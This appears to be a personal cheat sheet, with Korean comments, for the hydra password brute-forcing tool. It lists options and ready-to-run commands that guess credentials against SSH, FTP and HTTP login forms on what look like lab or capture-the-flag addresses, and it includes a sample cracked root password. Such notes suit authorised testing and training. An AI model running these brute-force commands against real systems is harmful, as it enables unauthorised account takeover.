# hydra

```bash
hydra -l <username> -P <full path to pass> 10.201.20.141 -t 4 ssh

# 주요 옵션
# -l : 단일 사용자명
# -L : 사용자명 리스트
# -P : 패스워드 리스트
# -s : 포트 지정
# -V : 시도하는 계정/패스워드 실시간 출력
# -t : 동시 스레드 수 (기본 16)
# -f : 첫 성공시 멈춤

# 설치 (kali는 기본 설치)
sudo apt update && sudo apt install -y hydra

hydra -l root -P passwords.txt 10.201.20.141 -t 4 ssh
hydra -l <username> -P <full path to pass> 10.201.106.187 -t 4 ssh

sudo hydra <username> <wordlist> 10.201.20.141 http-post-form "<path>:<login_credentials>:<invalid_response>"
# ssh brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
hydra -l <username> -P <wordlist> 10.201.20.141 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
# ftp brute force
hydra -l anonymous -P pass.txt ftp://10.10.10.10

# http-post-form (로그인 폼)
hydra -L user.txt -P pass.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
hydra -l think -P password.txt ssh://10.10.67.138 --t 40 -v
hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
"/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"

# 결과 예시
# [22][ssh] host: 10.10.10.10 login: root password: 123456
```
